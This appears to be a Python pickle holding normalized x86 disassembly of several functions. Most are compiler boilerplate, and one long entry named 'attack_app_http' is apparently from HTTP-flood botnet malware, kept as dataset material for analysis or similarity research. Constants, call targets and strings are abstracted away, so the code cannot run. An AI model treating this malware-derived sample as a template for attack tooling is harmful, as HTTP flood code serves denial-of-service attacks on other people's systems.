(lp0
(S'_init'
p1
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p2
L28L
tp3
a(S'__do_global_dtors_aux'
p4
S'"PUSH~EBP\nMOV~EBP,ESP\nSUB~ESP,0\nCMP~<STR>,0\nJZ~FOO\nJMP~FOO\nADD~EAX,0\nMOV~<STR>,EAX\nCALL~EDX\nMOV~EAX,<STR>\nMOV~EDX,[EAX]\nTEST~EDX,EDX\nJNZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nLEAVE\nRETN"'
p5
L72L
tp6
a(S'frame_dummy'
p7
S'"PUSH~EBP\nMOV~EAX,0\nMOV~EBP,ESP\nSUB~ESP,0\nCALL~FOO\nPOP~EDX\nADD~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~EAX\nADD~ESP,0\nLEAVE\nRETN"'
p8
L81L
tp9
a(S'_start'
p10
S'"XOR~EBP,EBP\nPOP~ESI\nMOV~ECX,ESP\nAND~ESP,0\nPUSH~EAX\nPUSH~ESP\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~ECX\nPUSH~ESI\nPUSH~0\nCALL~FOO"'
p11
L33L
tp12
a(S'attack_app_http'
p13
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~AL,[ESP+0]\nMOV~EBX,[ESP+0]\nAND~EAX,0\nMOVZX~EBP,[ESP+0]\nMOV~ESI,EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nPUSH~0\nMOV~EDI,EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nMOV~EDX,[ESP+0]\nTEST~EDX,EDX\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJLE~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nCMP~EAX,EDX\nJLE~FOO\nMOV~ECX,[ESP+0]\nADD~ECX,EDX\nMOV~DL,[ECX]\nLEA~EAX,[EDX-0]\nCMP~AL,0\nJA~FOO\nLEA~EAX,[EDX-0]\nMOV~[ECX],AL\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~[ESP+0],EDI\nCMP~EDI,0\nJLE~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EDI\nPOP~EAX\nPUSH~0\nMOV~ESI,[ESP+0]\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nMOV~ESI,EAX\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJLE~FOO\nMOV~ECX,EBP\nXOR~EBP,EBP\nAND~ECX,0\nMOV~[ESP+0],ECX\nMOV~EDX,EBP\nMOV~[ESI+0],0\nSAR~EDX,0\nMOV~EAX,EBP\nIDIV~,[ESP+0]\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[ESI],0\nLEA~EDX,[EDX+EDX*2]\nLEA~EDI,[EAX+EDX*8]\nLEA~EDX,[ESI+0]\nMOV~[ESP+0],EDX\nMOV~EAX,[EDI+0]\nMOV~[ESI+0],EAX\nPUSH~ECX\nPUSH~ECX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nCMP~[ESI+0],0\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nPOP~EAX\nLEA~EAX,[ESI+0]\nMOV~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~[EDI+0],0\nJA~FOO\nMOV~EBX,[EDI+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nXOR~ECX,ECX\nMOV~CL,[EDI+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESI+0],EAX\nCALL~FOO\nMOV~ECX,0\nMOV~EBX,EAX\nMUL~,ECX\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nMOV~EDX,[ESP+0]\nMOV~EAX,EBX\nSHR~EDX,0\nLEA~EDX,[EDX+EDX*4]\nSUB~EAX,EDX\nCMP~EAX,0\nJA~FOO\nJMP~<STR>\nLEA~EDX,[ESI+0]\nLEA~ECX,[ESP+0]\nLEA~EAX,[ESP+0]\nADD~ESI,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EDX\nMOV~[ESP+0],ESI\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~EDX,0\nMOV~[ESP+0],EAX\nMOV~ECX,EDX\nXOR~EAX,EAX\nMOV~EDI,[ESP+0]\nCLD\nSTOSD~,\nMOV~ECX,EDX\nMOV~EDI,[ESP+0]\nCLD\nSTOSD~,\nADD~ESP,0\nMOV~ESI,[ESP+0]\nTEST~ESI,ESI\nJLE~FOO\nMOV~ESI,[ESP+0]\nMOV~EBP,[ESP+0]\nADD~ESI,0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nJMP~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nSUB~ESP,0\nMOV~EDX,[ESI-0]\nMOV~[ESI-0],0\nPUSH~EDX\nCALL~FOO\nMOV~[ESI-0],0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nADD~EBP,0\nINC~EAX\nADD~ESI,0\nMOV~[ESP+0],EAX\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJZ~FOO\nMOV~AL,[ESI-0]\nLEA~EDI,[EBP-0]\nCMP~AL,0\nJZ~FOO\nTEST~AL,AL\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~EAX,[ESI-0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[ESI-0],EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nMOV~EAX,[ESI-0]\nPUSH~EAX\nCALL~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESI-0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EAX\nMOV~[ESP+0],0\nMOV~AX,[ESP+0]\nMOV~[ESI-0],EDX\nROR~AX,0\nMOV~[ESP+0],AX\nADD~ESP,0\nMOV~[ESI-0],0\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nMOV~EDI,[ESI-0]\nPUSH~EDI\nCALL~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nADD~ESP,0\nMOV~EAX,[ESI-0]\nCMP~[ESP+0],EAX\nJGE~FOO\nINC~EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EBX,[ESI+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~[ESI-0],0\nMOV~[ESI+0],0\nMOV~[ESI+0],0\nLEA~EAX,[EDI+0]\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~[ESI+0],0\nPOP~EAX\nPOP~EDX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nLEA~EDX,[EDI+0]\nMOV~[ESP+0],EDX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EDI+0]\nPOP~ECX\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EDI+0]\nPOP~ECX\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EDI+0]\nPOP~ECX\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~ECX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EBX\nPOP~EDX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~EBX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~EBX,EAX\nPOP~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nLEA~EDX,[ESP+0]\nADD~EDX,EBX\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,[ESI+0]\nTEST~EBX,EBX\nJLE~FOO\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EBX,[ESI+0]\nTEST~EBX,EBX\nJLE~FOO\nXOR~EBX,EBX\nSHL~EBX,0\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nLEA~EDX,[EBX+EDI+0]\nPOP~ECX\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nPOP~EBX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nADD~ESP,0\nCMP~[ESI+0],EBX\nJG~FOO\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EBX\nPOP~EDI\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~EDX\nPOP~ECX\nPUSH~0\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,[ESP+0]\nTEST~EDI,EDI\nJZ~FOO\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPOP~ECX\nPOP~EBX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nLEA~EDX,[ESP+0]\nLEA~EAX,[EDX+EAX]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nSUB~ESP,0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPUSH~0\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~ECX,[ESI-0]\nPUSH~ECX\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[ESI-0]\nMOV~[ESI-0],EDX\nMOV~EDX,EAX\nMOV~[ESI-0],0\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nADD~ESP,0\nMOV~EAX,[ESI-0]\nCMP~[ESP+0],EAX\nJGE~FOO\nJMP~FOO\nMOV~[ESI-0],0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~EBX,[ESI-0]\nSUB~EAX,EBX\nCMP~EAX,0\nJA~FOO\nMOV~EAX,[ESI-0]\nMOV~EDX,EAX\nAND~EAX,0\nSHR~EDX,0\nBTS~[ESP+EDX*4+0],EAX\nMOV~EAX,[ESI-0]\nCMP~[ESP+0],EAX\nJGE~FOO\nJMP~FOO\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EBX,EBX\nJLE~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],0\nMOV~EDX,EAX\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EAX,ECX\nSHR~ECX,0\nAND~EAX,0\nBT~[ESP+ECX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~AL,[EDX-0]\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nCMP~AL,0\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~EAX,0\nINC~EDX\nMOV~[ESP+0],EDX\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,[ESP+0]\nSUB~EDX,0\nMOV~[ESP+0],EDX\nMOV~ECX,[EAX-0]\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EDX,[ESP+0]\nPUSH~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nOR~EAX,[ESP+0]\nJNZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[EDX-0]\nMOV~[EDX-0],0\nJMP~FOO\nMOV~DWORDPTR[EDI],0\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EBX,[ECX-0]\nPUSH~EBX\nCALL~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nMOV~[EAX-0],0\nMOV~[EAX-0],0\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX-0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~0\nMOV~EBP,[ESP+0]\nPUSH~EBP\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+EAX+0],0\nPOP~ESI\nPOP~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EBX,[ESP+0]\nPUSH~EBX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~DWORDPTR[EDX],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~[ESP+EAX+0],0\nSETZ~AL\nLEA~ESI,[ESP+0]\nAND~EAX,0\nPUSH~0\nPUSH~0\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EBP,[ESP+0]\nPUSH~EBP\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~ESI,[ESP+0]\nPUSH~ESI\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~[ESP+EAX+0],0\nSETZ~AL\nLEA~ESI,[ESP+0]\nAND~EAX,0\nPUSH~0\nPUSH~0\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],ESI\nMOV~EBX,EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~ECX,[ESP+0]\nMOV~[ECX+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~EDX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nCMP~[ESP+EAX+0],0\nSETZ~AL\nLEA~ESI,[ESP+0]\nAND~EAX,0\nPUSH~0\nPUSH~0\nADD~EBX,EAX\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nADD~ESI,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nADD~ESP,0\nMOV~[ECX+0],EAX\nXOR~ESI,ESI\nLEA~ESI,[ESI+0]\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nLEA~EBX,[ESP+0]\nADD~ESP,0\nADD~EBX,ESI\nPUSH~EAX\nMOV~EBP,[ESP+0]\nPUSH~EBP\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nCMP~[EDX+0],0\nJG~FOO\nPUSH~EAX\nPUS